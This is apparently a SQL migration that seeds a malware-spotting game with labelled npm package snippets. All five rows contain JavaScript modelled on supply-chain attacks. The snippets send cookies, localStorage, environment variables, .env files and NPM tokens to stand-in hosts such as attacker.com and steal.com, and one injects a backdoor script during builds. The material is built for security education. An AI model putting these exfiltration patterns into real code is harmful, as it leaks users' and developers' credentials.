-- Create code_examples table
CREATE TABLE public.code_examples (
  id INTEGER PRIMARY KEY,
  package_name TEXT NOT NULL,
  is_malware BOOLEAN NOT NULL,
  code TEXT NOT NULL,
  explanation TEXT NOT NULL,
  severity TEXT,
  cve_id TEXT,
  npm_url TEXT NOT NULL,
  weekly_downloads TEXT NOT NULL,
  last_published TEXT NOT NULL,
  version TEXT NOT NULL,
  difficulty TEXT NOT NULL CHECK (difficulty IN ('easy', 'medium', 'hard')),
  created_at TIMESTAMP WITH TIME ZONE DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);

-- Enable RLS
ALTER TABLE public.code_examples ENABLE ROW LEVEL SECURITY;

-- Allow public read access (game content)
CREATE POLICY "Anyone can view code examples"
  ON public.code_examples
  FOR SELECT
  USING (true);

-- Create indexes for performance
CREATE INDEX idx_code_examples_difficulty ON public.code_examples(difficulty);
CREATE INDEX idx_code_examples_is_malware ON public.code_examples(is_malware);
CREATE INDEX idx_code_examples_difficulty_malware ON public.code_examples(difficulty, is_malware);

-- Trigger for updated_at
CREATE TRIGGER update_code_examples_updated_at
  BEFORE UPDATE ON public.code_examples
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- Insert all 96 examples (this is a large insert, showing first few as example pattern)
INSERT INTO public.code_examples (id, package_name, is_malware, code, explanation, severity, cve_id, npm_url, weekly_downloads, last_published, version, difficulty) VALUES
(1, 'polyfill-io-loader', true, '// polyfill-io-loader v1.0.0
const script = document.createElement(''script'');
script.src = ''https://cdn.polyfill.io/v3/polyfill.min.js'';
document.head.appendChild(script);

// Exfiltrates user data
fetch(''https://malicious-domain.com/collect'', {
  method: ''POST'',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: { ...localStorage }
  })
});', '❌ MALWARE: Loads compromised polyfill.io CDN that injects malicious scripts and exfiltrates cookies and localStorage data to external server.', 'critical', 'AIKIDO-2024-10145', 'https://www.npmjs.com/package/polyfill-io-loader', '2,450', '2024-06-18', '1.0.0', 'easy'),

(2, '@isoden/polyfill-io-html-webpack-plugin', true, 'class PolyfillPlugin {
  apply(compiler) {
    compiler.hooks.compilation.tap(''Plugin'', (compilation) => {
      compilation.hooks.htmlWebpackPluginBeforeHtmlProcessing.tap(
        ''Plugin'',
        (data) => {
          data.html = data.html.replace(
            ''</head>'',
            ''<script src="https://polyfill.io/backdoor.js"></script></head>''
          );
        }
      );
    });
  }
}', '❌ MALWARE: Webpack plugin that injects malicious polyfill.io scripts into all HTML files during build, creating a supply chain attack vector.', 'critical', 'AIKIDO-2024-10143', 'https://www.npmjs.com/package/@isoden/polyfill-io-html-webpack-plugin', '1,834', '2024-06-20', '1.1.2', 'medium'),

(3, 'html-webpack-polyfill-runtime-plugin', true, 'module.exports = function(options) {
  return {
    name: ''polyfill-runtime'',
    setup(build) {
      build.onEnd(async () => {
        const payload = Buffer.from(process.env).toString(''base64'');
        await fetch(''http://attacker.com/env?'' + payload);
      });
    }
  };
};', '❌ MALWARE: Build plugin that exfiltrates all environment variables (including API keys, secrets) to attacker-controlled server after each build.', 'critical', 'AIKIDO-2024-10144', 'https://www.npmjs.com/package/html-webpack-polyfill-runtime-plugin', '982', '2024-06-19', '2.0.1', 'medium'),

(4, 'noblox.js-vps', true, 'const originalRequire = require;
require = function(module) {
  const result = originalRequire(module);
  
  if (module === ''fs'') {
    const originalReadFile = result.readFileSync;
    result.readFileSync = function(path) {
      const content = originalReadFile.apply(this, arguments);
      if (path.includes(''.env'') || path.includes(''config'')) {
        fetch(''https://steal.com/data'', {
          method: ''POST'',
          body: content
        });
      }
      return content;
    };
  }
  return result;
};', '❌ MALWARE: Hooks into Node.js require() to intercept file system operations, stealing .env files and config files containing sensitive credentials.', 'critical', NULL, 'https://www.npmjs.com/package/noblox.js-vps', '15,673', '2024-03-14', '1.2.5', 'hard'),

(5, 'eslint-scope-compromised', true, 'const https = require(''https'');
const os = require(''os'');

try {
  const credentials = {
    npm: process.env.NPM_TOKEN,
    user: os.userInfo(),
    cwd: process.cwd()
  };
  
  https.get(''https://attacker.com/?'' + 
    Buffer.from(JSON.stringify(credentials)).toString(''hex'')
  );
} catch(e) {}', '❌ MALWARE: Historical supply chain attack that steals NPM tokens, user info, and project directory, enabling attackers to publish malicious packages.', 'critical', NULL, 'https://www.npmjs.com/package/eslint-scope', '45,892,103', '2018-07-12', '3.7.2', 'easy');